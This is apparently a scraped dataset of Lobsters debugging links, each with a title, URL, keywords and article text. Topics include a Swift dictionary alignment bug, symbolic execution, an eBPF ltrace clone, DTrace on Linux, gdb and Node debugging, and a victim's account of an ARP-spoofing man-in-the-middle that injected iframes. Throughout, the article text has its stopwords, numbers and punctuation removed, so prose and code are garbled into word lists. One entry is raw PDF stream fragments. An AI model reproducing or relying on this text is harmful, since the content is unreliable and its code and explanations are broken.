thompson finally went tried tested method brute force also known ripping app apart remove thirdparty codei removed every thirdparty dependency exclude possibility problem code luckily strict adding many thirdparty library one mostly supporting easily isolatable code like ssziparchive still crashing next removed framework commonly used component still crashing move suspicious piece empty projecti pretty suspicious heavyweight ar view pulled project still crashing great wild idea removed whole ar view still crashing every second run confusion peak level get stuck choose new angleat point solid theory blaming ar view ruined try another angle code fairly slim point thousand line parsing model kind data structure nothing concurrent everything running synchronously wanted try look crash site even though knew cause heap corruption could elsewhere seeing stack trace piece code every time made want look closer pattern started see always dictionary involved always simd type dictionary point ready give week tiring hunt really swift bug opened macbook tried something crazy ten minute later victory aftermathfinding problem significant chunk work end journey thing finally figure going workaroundbecause hey user still crashing u workaround replace value stresstesting dictionary instead value app seemed stable still idea dictionary problem wanted submit quick fix app store part story happy ending ever since change landed back crash free session rate file radar folk apple might unaware bug might lot people crashing reason need help know something like going lucky friend fellow hungarian swift standard library team karoly lorentey reached issue started tweeting progress excited finding submitted bug report erik eckstein submitted fix almost right away fix shipped swift xcode beta confirm version app used crash crash built new xcode beta karoly also kind enough explain problem let briefly go cause heap corruption craziness actual problemthe actual problem restricted old device platform every device affected actual problem dictionary specific collection type affected storing type alignment greater byte element unusually wide alignment storage standard library collection type guaranteed always allocated correct alignment start storage fall suitable address dictionary rounded closest alignment boundary offset ensured correct alignment also meant last dictionary element may ended partially outside allocated buffer leading form buffer overflow innocuous combination oslanguagedevice parameter probably caused issue trigger frequently probably became noticeable particular device running io alignment alignment defines amount padding needed make data line even memory address processor efficient memory access data aligned properly still work unaligned address performance hit arm strict instance unaligned access allowed cause alignment fault fact many swift type alignment greater byte reason issue occurred app using simd type extensively simd type tend wide alignment even though tried debugging problem address sanitizer instrument memory inspection never caught wonder lesson learnedidentifying fixing bug big part software engineer job know sometimes nice review bigpicture step make sure gathering correct signal find consistent reproduction case bisect find another way go back time track back problem analyze slice code always challenge assumption work way smallest simplest bit problem code document everything end simple project exercised bug along copious note enough file bug report apple learned methodical approach little brute force wear problem finally learned sometimes ceo right sorry eric question comment feedback regarding article find twitter vasarhelyia welcome dm open lovely team polishing article second part article coming explaining problem detail swift team apple solved stay tuned
336,Lobsters,debugging,Debugging,A few things I've learned about computer networking,https://jvns.ca/blog/2018/03/05/things-ive-learned-networking/,thing learned computer networking,arp spoofing traceroute work building tcp stack python cdns understand little tcp sni mean blog post tl stricttransportsecurity header linux networking stack handle packet slow internet purpose tc tweet learning take lot time http googlecom,somebody asked month ago hey best way understand computer networking really know answer question learned lot thing know work think picking new thing need fine thought could maybe useful list bunch concrete skill concept learned along way like anything else computer networking involves large number different concept skill tool learned one time picked thing last year set apache web server copying pasting thing internet http request look like get post etc use curl send get post request send http request hand netcat arp spoofing arp mac address packet addressed mac address local network traceroute work involves learning basic ip protocol work ttl network packet look networking packet wireshark basic tcp work example looking http request wireshark building tcp stack python key thing syn packet dns work like record cname record dns query look like wireshark good http like cache header interact cdns cdns mtu exists cause networking issue badly tuned tcp connection setting like tcpnodelay cause noticeable networking performanace issue understand little tcp http security header like cors sni mean use tcpdump debug firewall issue capture packet tcpdump somewhat weird way instance specific kind dns response reliably use tcpdump without reading man page ssltls ssl cert get one issued ssl cert put together tool openssl blog post tl advanced httpssl stuff like stricttransportsecurity header basic understanding bgp packet get routed internet slightly advanced dns authoritative dns server recursive dns server vague understanding linux networking stack handle packet like packet get sent tcpdump routing slow internet purpose tc set nat rule iptables inspect route table containerdocker networking network namespaces route table per tweet ping computer connected whois domain registered ssh curl making http request tcpdump record packet check traffic port dignslookup debugging dns issue netstatss port used ifconfig ip address ip command replacement ifconfig useful wireshark look packet gui ngrep grep network iptables socat connect unix domain socket tcp socket nsenter debugging container networking problem learning take lot time spend fair amount time trying learn new computer thing found really useful take one step time learning process lot stuff basically identify something small know command line check expiration date http googlecom tl certificate figure sometimes help great coworkers repeat really fun see learning bunch tiny thing add time like today feel like handle thing computer networking run job feel like many big new idea networking know though well wifi still mystery
337,Lobsters,debugging,Debugging,Symbolic Execution: Intuition and Implementation,http://www.usrsb.in/symbolic-execution-intuition-and-implementation.html,symbolic execution intuition implementation,github introduction automatic test generation detection failing asserts detection buggy behavior detection invariant violation implementation stack language program counter memory area stack github symbolic execution engine symbolic concrete path constraint path constraint program counter path constraint program counter implementation throughout github constraint solving sbv appendix github putting together conclusion survey real world success existing tool appendix constraint solving sbv,article give brief tour program analysis technique called symbolic execution title indicates aim explain intuition behind technique also detail simple implementation intended audience professional programmer background program analysis group caught awkward position although believe could greatly benefit program analysis community offer knowledge seems stuck academia hidden behind technical jargon kept reach dedicated enthusiast hope article spark interest professional programming community people interested writing tool people interested using tool start describing intuition behind technique walk simple implementation implementation haskell done best treat haskell pseudo code explain snippet depth entire implementation github introduction suppose testing following function test case might write compute absolute value int def ab x assert type x int x return x else return x two come mind test x negative number test x positive number particular condition rationale course feed value test code path test interest might test boundary condition x extreme minimum maximum integer goal test function interesting path triggered interesting value programmer coming test case second nature might process described algorithm starting point ask known value x different point program entry point function little known x since python dynamically typed x may even int assert x must least int could int inside first branch x must negative first return statement x negated branch must return positive int inside second branch x must positive thus also return positive int reasoning backwards observation clear negative int required test second branch either positive int required test first interesting thing note first step program think specific value x like instead think set possible value x might take different point program x might element integer negative integer positive integer plus word think x symbolic value ie set possible value rather concrete value ie particular element set possible value second program branch set possible value constrained x might integer first assert value flow first branch known negative integer word branch enforce constraint possible value x process programmer perform instinctually time topic article symbolic execution idea formalized automated produce interesting result name automatic test generation programmer performs process informally create test case automated process generate test case exercising explored path detection failing asserts since symbolic execution track set possible value flow assert statement information used check value set violate assert value reported back programmer detection buggy behavior behavior despite well defined usually unintended indicative bug example language fixed width integer overflow usually unintended since symbolic execution engine know value flow detect addition might result overflow example x unconstrained integer value x xy result overflow detection invariant violation invariant property always true point execution eg left child binary tree always le equal parent balance smart contract always positive zero automatically exploring many path symbolic execution detect path violate invariant report back input trigger path implementation implementing symbolic execution engine first need language symbolically execute purpose put together small stack language first part section describe implementation stack language second describe symbolic execution engine language chose stack language resemblance low level bytecode symbolic execution engine often target low level bytecode assembly language agnostic depend correctness compiler stack language keep section brief since language focus worthwhile walk implemenation see compare symbolic execution engine also describe semantics language language program list instruction instruction operate global stack stack word add instruction example pop first two item stack add push result program read two number console add print result since written parser program haskell list addtwonumbers instr program list instruction addtwonumbers read read console push stack read add add number top stack push result stack print print number top stack done end execution entire instruction set along informal description semantics semantics described using notation example b b mean instruction executed b top stack instruction executed top element result b data instr add b b b b b b else lt b b eq b b push pop swap b b dup b c b c rotl b c b c read read console base print printed console base jmpif cond addr pc addr cond store addr val mem addr val load addr mem addr done deriving eq show straightforward instruction basic arithmetic add eq lt etc logic etc manipulate stack push dup rotl etc instruction deserve special attention jmpif load store jmpif control flow instruction pop jump condition target address stack jump condition true ie nonzero instruction jump target address changing value pc program counter otherwise move next instruction machine also memory area map word word store pop first two item stack first address second value store value memory area using address key load load address top stack push value address onto stack formalize bit execution program defined manipulation three data structure instruction manipulates different way program counter contains address current instruction address index list instruction constitute program thus address first instruction memory area map word word read modified load store instruction stack stack word instruction operate program executed walking list instruction updating three item accordingly update one step program implemenation structured way function called run walk program repeatedly call function called step take current state return new state depending current instruction concretely program state represented int program counter map word memory area stack list word definition program state program counter memory stack type state int map instruction single step increment program counter performs operation stack implemenation add given current state instruction carry instruction returning new updated state implementation add shown step state instr io state step pc mem l r stack add return mem lr stack step function parameterized constitutes program state current instruction element program state update described pc program counter set address current add instruction mem memory area mapping word word l r stack stack top two item pattern matched bound l r execution add instruction mean taking state described updating following program counter incremented next instruction mem memory area unchanged lr stack l added r pushed onto top stack execute program step called repeatedly run function fetch new instruction feed step repeat encounter done instruction exact mechanic run function terribly important reproduced comment completeness given program initial state run program return final value stack run prog state io run prg state pc stack fetch next instruction case prg offset pc done instruction done stop execution return stack return stack instr otherwise execute instruction call step get new state step state instr run prg nothing instruction address throw error error instruction show pc complete implementation github symbolic execution engine symbolic execution proceeds similarly normal execution program state path constraint covered shortly updated repeatedly symstep function two difference set apart normal execution memory area stack store symbolic rather concrete value instead operating stack word symbolic execution operates stack symbolic expression describe set word set represent value stack entry memory entry might contain execution multiple execution path explored exploring path set condition accumulated describing value concrete execution would trigger particular path called path constraint introductory example must negative flow example path constraint ideally execution path explored exhaustion often possible practice getting implementation explore idea detail symbolic concrete difference symbolic value concrete value example concrete word example symbolic word x symbol x stand word set possible word symbolic execution stack memory area contain symbolic rather concrete value look example program develop better intuition mean addition program read two number console add print addtwonumbers instr program list instruction addtwonumbers read read console push stack read add add number top stack push result stack print print number top stack done end execution symbolic execution read instruction actually query user input instead create symbolic value representing value user might input push symbolic value onto stack read instruction stack look like x symbolic value represents word similar programmer trying test ab function introduction symbolic execution reason possible value rather specific value second read another symbolic value pushed onto stack finally add instruction x popped stack data structure representing addition x pushed onto stack point worth asking inferred state symbolic stack value x known following inferred stack contains single entry thus next instruction print safe entry could word yx could evaluate word depending value x x unconstrained addition could result overflow even program simple possible derive interesting property get even interesting program contains branch moving wrap example final two instruction print done pop final value stack end symbolic execution execution symbolic nothing actually printed console additional question ask point given symbolic execution whole infer point program crash due lack argument stack program end empty stack data left program counter always point valid instruction program terminates program explored exhaustively true possible execution program might think trivially true one path program remember also explored possible value although could achieve coverage single test would take test verify property value matter input give program never crash always exit clean stack said real world usually case exploring program exhaustion intractable often possible make strong statement program based symbolic execution alone next section explore branching affect symbolic execution path constraint mentioned becomes interesting program contains branch version addition program print result greater necessary understand exact mechanic program suffice say program read two number add compare result either jump print instruction end execution immediately done instruction instr read read add dup push lt push address print instruction swap jmpif result jump print instruction done otherwise exit print done fast forward right jmpif instruction stack contain following symbolic value topmost value symbolic representation condition two input x must sum value greater second value address jump condition true rather symbolic variable like x part program push know sure stack entry take value finally result yx bottom stack case need printed jmpif evaluated possible tell expression condition true false value x x true false mean engine must explore branch keep track condition must true given branch case jump record x must true case jump record x must true constraint known path constraint primary way learn thing symbolic value program path constraint carried along program state examining true case x added path constraint program jump print instruction new program state path constraint x program counter print instruction addition symbolic stack path constraint asserts something value x point program inferred set possible value x could take still quite large known certainty element false hand element set true yx could overflow upcoming print instruction safe stack contains least one element branch similar except path constraint negated path constraint x program counter done instruction branch possible value x constrained know set key takeaway branch constraint set concrete value symbolic value might take solving path constraint reveals value trigger given path one last bit puzzle constraint solved usually constraint sent smt satisfiability modulo theory solver report back constraint satisfiable concrete value satisfy inner working smt solver beyond scope article treat oracle implementation similar concrete execution symbolic execution proceeds walking program repeatedly updating program state diving right add instruction implemented compare implemenation step given symbolic state instruction return new state updated according semantics instruction add shown symstep symstate instr symstate symstep pc mem l r stack c add mem sadd l r stack c similar step take state return new state updated accordingly two main difference symstate rather state updated symstate represents symbolic state rather concrete state list symstates rather single state returned symstate similar state except also hold onto list path constraint stack memory area hold onto sym rather word sym data type used represent symbolic expression type symstate int program counter int unique variable counter map sym memory area sym symbolic stack sym path constraint list note memory area map word sym address memory area still concrete later finally sym data type representing symbolic expression constructed like typical expression tree resembles ast simple expression language data sym sadd sym sym addition seq sym sym equality snot sym logical sor sym sym logical scon concrete word sand sym sym logical slt sym sym le sany int word set word deriving show eq ord example sym data type used represent symbolic expression cany example represents word variable x used throughout article cany used uniquely identify symbolic value eg used multiple time cany yx cadd cany cany scon x slt scon cadd cany cany x snot slt scon cadd cany cany cadd cany cany turn attention back symstep add examine update one one component symbolic state follows pc still program counter still int counter incremented time symbolic value created value used uniquely name symbolic value make sense examine symstep read instruction mem memory area mapping word symbolic expression l r stack symbolic stack first two entry bound l r c list path constraint updated following way pc program counter incremented next instruction symbolic value created changed mem add affect memory area unchanged l r stack symbolic expression adding l r created sadd l r pushed onto stack c path constraint added unchanged read interesting instruction introduces new symbolic value implementation symstep pc mem stack c read mem sany stack c used argument sany data type represents symbolic value symbolic value sany pushed onto stack represent arbitrary user input returned keep counter unique course actual io happens jmpif especially interesting branching instruction implementation symstep symstate instr symstate symstep pc mem cond scon addr stack path jmpif create multiple state one branch condition mem stack snot cond path false branch wordtoint addr mem stack cond path true branch symstep pc mem stack path jmpif explore true branch destination address symbolic mem stack path several notable difference add read first instruction return multiple new state one branch first case condition false pc incremented next instruction jump occurs case condition true pc set jump destination second also notice path path constraint updated first jump condition popped stack bound cond exploring true case cond added path constraint exploring false case negation added snot cond finally true branch explored destination address concrete note scon addr pattern match argument list necessary consider would happen address concrete suppose example jump address x word would mean program could jump address exploring many branch quickly becomes intractable compromise made branch concrete destination address explored case trading exhaustiveness tractability order make analysis tractable compromise made bug may missed imagine coming intelligent way handling situation exhaustiveness must traded tractability active area research load store instruction suffer similar problem symbolic value flow address argument destination address word store could store memory location similarly possible load load memory location many way handling one way treat branching instruction possible address one branch program word one branch load address another branch load safest option sense exhaustive quickly becomes intractable technique trade exhaustiveness tractability exploring subset possible address keep implementation simple analysis something much dumber ignores instruction store symbolic address alternatively asked load symbolic address generic symbolic value loaded since could loaded anywhere approximates possible value making result word consequence instruction ignored symbolic execution might diverge entirely semantics real program end missing bug really exist flagging bug really exist example case symbolic value used load analysis might miss bug actual memory address empty although real world symbolic execution engine use sophisticated solution dealing situation getting habit thinking trade offs worthwhile lot research area coming better technique handling case carefully thinking affect analysis implementation store storing concrete address update memory area accordingly symstep pc mem scon addr w stack c store minsert addr w mem stack c storing symbolic address ignore instruction symstep pc mem stack c store mem stack c implementation load loading concrete address load value memory area symstep pc mem scon addr stack c load case mlookup addr mem w mem w stack c nothing error nothing load address loading symbolic address treat load loading possible word symstep pc mem stack c load mem sany stack c last step symbolic execution calling symstep repeatedly either path explore exhaustively certain execution depth reached analysis return tree state path root leaf represents explored execution path node represents executing one instruction symrun int prog symstate ttree symstate symrun maxdepth prog state pc fetch current instruction case prog offset pc done instruction done terminate execution branch tnode state instr maxdepth get new state might one recursively call symrun let newstates symstep state instr child fmap symrun maxdepth prog newstates tnode state child else max depth reached terminate execution tnode state nothing error instruction show pc note path exploration proceeds depth first way symbolic execution reframed search problem better technique exploring tree possible path active area research complete implementation github constraint solving final step send path constraint contraint solver toy example program executed abitrary depth constraint solver invoked resulting tree separating stage simplifies implementation real world engine would interleave step information constraint solver could used symbolic execution translating constraint matter walking constraint syntax tree sym translating node whatever data structure smt solver us chosen use sbv interface smt solver library specific go much detail done please see appendix detail interesting form contraints take suppose following path constraint get translated following x x x symbolic variable existentially quantified path constraint conjoined smt solver report back formula satisfiable assignment x make formula true case formula might report satisfiable x mean path possible path program constraint satisfiable triggered setting x formula unsatisfiable would mean particular path could never taken one reason constraint solving symbolically executing valuable branch impossible pruned resource wasted exploring always complete implementation github putting together execute example program symbolically examine output program add input together print sum instr read read add dup push lt push address print instruction swap jmpif result jump print instruction done otherwise exit print done symbolically executing yield following result pc stack path constraint solved value trivial pc stack path constraint solved value trivial pc stack path constraint solved value trivial pc stack path constraint solved value trivial pc stack path constraint solved value trivial pc stack path constraint solved value trivial pc stack path constraint solved value trivial pc stack path constraint solved value trivial pc stack path constraint solved value trivial pc stack path constraint solved value pc stack path constraint solved value pc stack path constraint solved value node tree represents single snapshot symbolic state point program path tree represents path program pc program counter field symbolic state immediately executing instruction program counter initial read instruction executed two symbolic variable pushed onto stack one read instruction first called second pc stack path constraint solved value point path constraint true trivially true path constraint word input program trigger path always run thing get interesting branch pc stack path constraint solved value trivial pc stack path constraint solved value pc stack path constraint solved value pc address jmpif instruction two child representing side branch one branch represents condition false first child represents true second child input would trigger branch section tell u setting first input second would trigger false half branch indeed greater node see trigger half branch indeed greater another program loop forever loop instr loop push jump destination push condition always true jmpif done condition always true always jump back beginning program fragment symbolic program trace pc stack path constraint solved value trivial pc stack path constraint solved value unsatisfiable pc stack path constraint solved value trivial first node jmpif instruction two child side branch first half branch false half return result unsatisfiable section solver correctly deduces path constraint never true must case branch never taken hand true half branch return trivial indicating path constraint trivially satisfiable branch always taken two example given perhaps interesting impressive real power technique using information gained symbolic execution flag issue like failing asserts integer overflow although covered tutorial image might look like given path constraint assert smt solver tell value satisfy constraint negate assert possible assert fail overflow possible ask solver satisfying value trigger overflow bit beyond could even imagine using temporal logic assert property entire execution tree p true eventually q true possibility go conclusion goal writing tutorial bring technique wider audience particular believe promising technique mostly automated seen real world success hope interest keep exploring good place start survey contains good overview sophisticated technique dealing memory address jump follow post like talk real world success existing tool use today appendix constraint solving sbv constraint solving sbv matter walking sym tree translating node appropriate sbv command sadd implemented import qualified datasbvdynamic symtosmt sadd l r ssvplus symtosmt l symtosmt r operand sadd converted recursive call symtosmt plus operation applied svplus worth pointing untyped api datasbvdynamic must used creating sbv expression runtime arbitrary word created using svmksymvar function create existential word bit name name swordex int string ssymbolic ssval swordex name ask liftio ssvmksymvar sex skbounded false tolist name shown possible specify variable bounded many bit value signed also specify variable existentially sex universally quanitified use bounded unsigned word existentially quantified skbounded false sym tree translated tree walked symbolic variable collected sany walk constraint gathering free variable gatherfree sym sset sym gatherfree c sany ssingleton c gatherfree sadd l r gatherfree l gatherfree r gatherfree seq l r gatherfree l gatherfree r gatherfree snot c gatherfree c gatherfree sor l r gatherfree l gatherfree r gatherfree sand l r gatherfree l gatherfree r gatherfree slt l r gatherfree l gatherfree r gatherfree scon mempty set symbolic variable used declare variable smt solver translating expression declared variable saved map retreived symbolic expression reference symtosmt sany case mlookup val return val nothing error missing symbolic variable
338,Lobsters,debugging,Debugging,Prototyping an ltrace clone using eBPF,https://jvns.ca/blog/2018/02/24/an-ltrace-clone-using-ebpf/,prototyping ltrace clone using ebpf,suggested ltracebcc http githubcomjvnsrustbcc http githubcomjvnsltracebccblobmastersrcmainrs ltrace problem ltrace goal write clone ltrace attach running process rust bpf library ltrace work ltrace work getting list dynamically linked function program using ebpf trace function getting data back ebpf work elf struct goblin crate,week ago twitter leandro pereira suggested building clone ltrace using ebpf bcc yesterday today hacked together prototype ltrace clone using ebpf bcc github called ltracebcc think pretty cool post work prototype us bcc crate rust http githubcomjvnsrustbcc started building week ago code http githubcomjvnsltracebccblobmastersrcmainrs like line thought cool possible implement cool thing little code wanted explain work ltrace ltrace program trace library call run ltrace yourcommand ltrace tell c function example libc command called example running ltrace l seeing get bunch environment variable ltrace l getenv quotingstyle nil getenv column nil ioctl getenv tabsize nil getoptlong abcdfghiklmnopqrstuvw xabcdfghi getenv lsblocksize nil getenv blocksize nil getenv blocksize nil getenv posixlycorrect nil getenv blocksize nil neat way spy program different spying system call problem ltrace main problem ltrace even though p option attach process process id pid begin tracing think ever able get option work run sudo ltrace p somepid nothing happens even though pretty sure process tracing calling library function fully understand ltrace attach process post problem introduces lot performance overhead reason strace work using ptrace run program without ltrace ltraced version way slower goal write clone ltrace attach running process wanted try write ltrace clone could attach running process figured could prototype pretty easily rust bpf library worked week ago using ebpf bcc tracing general faster using ptrace tracing ltrace approach also lower overhead maybe suitable production use ltrace work going try write ltrace clone need understand ltrace work least little packagecloud blog among lot great system post good post called ltrace work explains rehash whole post key point ltrace trace dynamically linked function function run dynamically loaded library like libc something get list function trace ltrace par process elf file looking plt procedure linkage table ltrace insert breakpoint function going insert breakpoint ignore everything need get list function trace getting list dynamically linked function program find function dynamically linked program sound hard turn hard basically run readelf find bunch function name section reladyn relaplt list function clear difference two yet binary seem relaplt section rust literally line code comment code take filename print dynamically linked function name fn printdynamicfunctions filename str result error read file let mut content vec vec let mut elf file open filename elfreadtoend mut content parse elf using goblin crate let binary goblin elf elf parse content context failed parse elf file load function name reladyn section dynrel binarydynrelas need look symbol name function name binarydynsyms binarydynstrtab let sym binarydynsymsget dynrelrsym unwrap let name binarydynstrtabget symstname unwrap println name ok using ebpf trace function okay list function want trace actually trace way ebpf uprobes work ask linux kernel attach ebpf code write userspace function example strlen something code send data back userspace basically wrote super simple template save name struct sends event replaced name name every function want trace generate tracefunstrlen tracefunstrcpy etc let template int tracefunname struct ptregs ctx struct datat data strcpy datafunctionname name eventsperfsubmit ctx data sizeof data return name function bpfcode templatereplace name name tracefunstrlen function submit event every time called need attach strlen function libc super easy name function let uprobename format tracefun name let uprobecode moduleloaduprobe uprobename moduleattachuprobe library name uprobecode pid getting data back ebpf getting message back function called super easy need set callback print install callback code look like rust int main initial setup let table moduletable event let mut perfmap initperfmap table perfdatacallback loop perfmappoll fn perfdatacallback box fnmut send box new x let data parsestruct x println getstring datafunctionname getstring work couple example using ltrace prototype running firefox process figure traced call pthread library call libc think cool see locking unlocking mutexes like see pthreadmutexlock followed corresponding pthreadmutedunlock address call strlen made read string address first argument see string calculating length sudo targetdebugltracebcc possible library sudo targetdebugltracebcc pthreadmutexunlock pthreadmutexlock pthreadmutexlock errnolocation pthreadmutexunlock pthreadmutexlock pthreadmutexunlock pthreadmutexunlock sudo targetdebugltracebcc clockgettime strlen mozillaorgdocshel strlen mozextension strlen mozextension clockgettime think cool example excited rust like got idea try work ltrace clone couple day prototype something kinda work make happy library thing like parse elf goblin really easily available rust definition elf struct goblin crate thing beauty everything might know elf file previously using elf crate parse elf file goblin crate way better support parsing thing like relocation reladyn section elf crate like rust crate generally try make thing simpler harder like introduce unnecessary abstraction make relatively easy get information need
339,Lobsters,debugging,Debugging,The Hurricane's Butterfly: Debugging Pathologically Performing Systems,https://www.youtube.com/watch?v=7AO4wz6gI3Q,hurricane butterfly debugging pathologically performing system,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature hurricane butterfly debugging pathologically performing system youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature hurricane butterfly debugging pathologically performing system youtube
340,Lobsters,debugging,Debugging,My Favorite Bug (WadlerFest 2016),http://www.ccs.neu.edu/home/types/resources/pdf/serrano-2016.pdf,favorite bug wadlerfest,,obj endobj obj endobj obj endobj obj extgstate font procset pdftext xobject rotate r typepage endobj obj border c dest f subtypelinktypeannot endobj obj subtypeformtypexobject stream endstream endobj obj stream vgwo e l hkѣ w c
341,Lobsters,debugging,Debugging,Debugging C like it's Python,http://blog.asrpo.com/debugging_c_like_python,debugging c like python,debugging c like python pdb ipdb flpc gdb writing everything assembly use python pdbstacktrace pdbpm using gdb footnote blog index,debugging c like python use python interpreter interactively pdb well ipdb lot let understand program state test new thing quickly writing flpc c found difficult transition post describe use gdb get similar workflow course project also gained much greater appreciation c compared writing everything assembly really convenient macro used moderation let customize language bit get around quirk use python pdbstacktrace set breakpoints code know possible set breakpoint debugger find uniform syntax code debugging command easier remember use pdb import settrace bp def someproblematicfunction somecondition bp bp called get repl examine value pdb p somevar pdb p f somevar move forward single step examining value eventually continue well pdb pdb pdb n pdb c bp called rarely enough let get crux problem quickly without setting explicit conditionals also tend throw bp around add new function breaking beginning function new functionality already defined one let test real data instead artificial data using prefix run command function input value paste command worked back text editor even started adding blank function bp body let write function sample input hand pdbpm pdbpostmortem start postmortem debugging tend run python interactive mode program crash start debugger import pdb pdbpm pdb move around stack examine value removed almost print statement logging debugging used let examine value would nt thought printing beforehand started program unfortunately possible continue c case using gdb compile binary include debugging information gcc flpcallc flpc gdb flpc gdb r commandlineparameters gdb expand macro gdb p somevar gdb p somemacro somevar make call gdb call p get effect pdbsettrace create empty function bp void bp set breakpoint running program gdb b bp similarly error occurs route function error defined void error char printf sn exit use like pop localstack sep error popping empty data stack n like bp set breakpoint error running program gdb b error input program change source nt nt need exit gdb rerun gdb r commandlineparameters time footnote version control help find remove commiting posted feb blog index
342,Lobsters,debugging,Debugging,dtrace for linux,https://gnu.wildebeest.org/blog/mjw/2018/02/14/dtrace-for-linux-oracle-does-the-right-thing/,dtrace linux,dtrace linux oracle right thing dtrace linux debugging tool devroom dtraceutils libdtracectf dtrace project source control news elfutils linux kernel dtrace update dtracelinuxkernelgit universal permissive license compatible gnu gpl waving magic relicensing wand systemtap dynamic probe envisioned dprobes stapbpf,dtrace linux oracle right thing posted february fosdem talk dtrace linux debugging tool devroom explicitly mentioned talk certainly exciting thing oracle proper linux kernel port commit author tomas jedlicka tomasjedlicka oraclecom date tue aug dtrace integrate dtrace module kernel proper changeset integrates dtrace module source main kernel source tree license source moved appropriate location kernel tree right dtrace dropped cddl switched gpl user space code dtraceutils libdtracectf combination upl found dtrace project source control page news file mention license switch build upon elfutils personally pleased find kernel source core kernel upl uapi slightly harder find inside uek kernel source tree following commit easily get whole linux kernel dtrace directory update dtracelinuxkernelgit repository dtrace commits rebased top recent upstream linux kernel upl universal permissive license according fsf lax noncopyleft license compatible gnu gpl thank oracle making everyone life easier waving magic relicensing wand lot hard work actually properly integrate sure lot technical hurdle trying get upstreamed mainline kernel hard work start collaborating earnest like systemtap dynamic probe dprobes dtrace whole system observability tool combining tracing profiling probingdebugging technique something upstream linux kernel hacker always appreciate presented one large system prefer separate small tweak tracing profiling probing mostly separate took year various hook kprobes uprobes marker etc systemtap system get upstream day even byte code interpreter ebpf mainline kernel originally envisioned dprobes systemtap target stapbpf technique available linux kernel exciting see dtrace linux unite
343,Lobsters,debugging,Debugging,Inspector - A drop-anywhere C++ REPL,https://github.com/inspector-repl/inspector,inspector dropanywhere c repl,inspector dropanywhere c repl pry pdb presentation slide inspector min video presentation inspector cppcast inspector build requirement build cling binary build inspector usage todo,inspector dropanywhere c repl allows inject fullyfunctional repl running compiled program access program state offer feature like codecompletion syntax highlighting api similar tool like pry ruby pdb python example program save maincpp include iostream include string int main int argc char argv int std string b hello world include inspector std cout second break std endl include inspector inspector prebuild maincpp clang inspector printcflags maincpp main inspector repl main presentation slide inspector min video presentation inspector cppcast inspector build requirement c compiler gcc clang libcling see installation instruction jsoncpp pythonprompttoolkit pythonsetuptools pkgconfig build cling note linux distribution cling project also provide prebuild binary git clone http rootcernchgitllvmgit src cd src git checkout clingpatches cd tool git clone http rootcernchgitclinggit git clone http rootcernchgitclanggit cd clang git checkout clingpatches cd mkdir build inst cd build cmake dcmakeinstallprefix inst cmake build cmake build target install build inspector git clone git githubcom inspectorreplinspectorgit cd inspector mkdir build cd build cmake dcmakeprefixpath inst cmake build usage bring python binding requires clang support clang branch cling new enough libclang path export pythonpath readlink f llvmroot srctoolsclangbindingspython export ldlibrarypath readlink f llvmrepo instlib cd build inspector prebuild testtestcpp gcc testproc inspector printcflags testtestcpp start repl cli inspector repl let program connect repl testproc todo
344,Lobsters,debugging,Debugging,Debugging Node without restarting processes,https://hackernoon.com/debugging-node-without-restarting-processes-bd5d5c98f200,debugging node without restarting process,debugging node without restarting process nodeinspector official node doc twitter reactiflux nodeiflux,debugging node without restarting processesi typically frontend developer every find writing maintaining backend code one significant drawback encountered switching context node lack chrome developer tool really highlight hard lean day day web development luckily option enabling gotten much stable usable recent time node built debug mode allows connect devtools package called nodeinspector connects automaticallyit worth noting version node use nowlegacy debugger api node introduces inspector api better integrates existing developer toolsthere one common theme encountered using method must invoked starting node process day found process odd state trouble reproducing want risk losing restarting process enable inspectorhowever found solution le solution official node docsa nodejs process started without inspect also instructed start listening debugging message signaling linux o x applies unix based os sorry window user saved bacon case kill command unix may ominously named also used send arbitrary signal running process man kill tell using syntax kill signalname pid list signal name enumerated kill l shown kill lhup int quit ill trap abrt emt fpe kill bus segv sys pipe alrm term urgstop tstp cont chld ttin ttou io xcpu xfsz vtalrm prof winch info default kill sends int interrupt signal equivalent hitting ctrlc terminal window lot depth process signal get encourage explore towards end list node doc referring need pid process id send find using p grep narrow list processing running system p grep node snipbinconcurrently npm run watch server npm run watch node snipbinconcurrently npm run watch serverfiles npm run watch node snipbinwebpack node snipbinconcurrently npm run build snip node snipbinnodemon delay watch dist usrlocalbinnode grep colorauto nodemy output little noisy due complex build toolchain spawn many process see towards bottom right process node distsrcserverjs pid know signal name pid need runit run output check log node process seei open chrome inspect immediately see inspect targeti click inspect rewarded chrome devtools window context node process use profiler audit performance use source tab add break point inspect running code use console view log modify variable current scope like would webi also twitter mostly tweet tech stuff reactiflux answer question react also moderate nodeiflux sister server node developerssubscribe get daily roundup top tech story
345,Lobsters,debugging,Debugging,A Man-in-the-Middle Attack in the Wild (2011),https://jcs.org/notaweblog/2011/08/17/a_man-in-the-middle_attack_in_the_wild,maninthemiddle attack wild,securely ssh maninthemiddle attack update,last night tried visit one website host one dedicated server surprise saw instead usual content first reaction gzip compression possibly broken server weird compatibility issue firefox upgraded enabled web console see actually received highlighting mine appeared gzipped output prepended hidden iframe trying load chinese website content sent proper contentencoding header firefox see compressed displayed raw content iframe loading junk webpage background google ad according source code though two stats page port never loaded due little snitch blocking traffic firefox seeing information thought maybe dns hijacking either dns server website dns resolver local network quick dns troubleshooting determined everything fine took phone disabled wireless tried loading site time network monitor sent message jabber content jcsorg changed something expecting monitor site way quickly get notified coming error page instead case page defaced point least two website server showing similar output stomach sank mind jumped able securely ssh server quite slow respond web console output show took m download initial page site wanting type password possibly compromised server looked around website directory see hidden iframe code may hiding nothing appeared ordinary server looked central syslog server noticed coming problematic server aug thalamus bsd arp info overwritten ae aug thalamus bsd arp info overwritten fb aug thalamus bsd arp info overwritten ae aug thalamus bsd arp info overwritten fb aug thalamus bsd arp info overwritten ae aug thalamus bsd arp info overwritten fb aug thalamus bsd arp info overwritten ae aug thalamus bsd arp info overwritten fb clicked rogue server network dedicated hosting provider broadcasting fake arp entry router server fake arp entry fb cached sending output rogue server transparently rewriting http traffic prepend hidden iframe code sending real router classic monkeymaninthemiddle attack program used rewrite traffic must understood gzipped content properly causing garbled output seeing firefox point realized server compromised least traditional sense needed avoid rogue server used arping one first openbsd port submitted way back get output show network provider jcs thalamus sudo arping password arping byte ae usec byte fb msec byte fb msec byte fb msec byte fb msec byte fb msec byte fb msec byte fb msec byte fb msec byte fb msec byte fb msec byte fb msec byte fb msec byte fb msec byte fb msec byte fb msec byte ae msec byte fb msec byte fb msec byte fb msec byte fb msec byte fb msec byte fb msec byte fb msec byte fb msec byte fb msec byte fb msec byte fb msec byte fb msec byte fb msec byte fb usec byte fb usec clearly rogue server fb 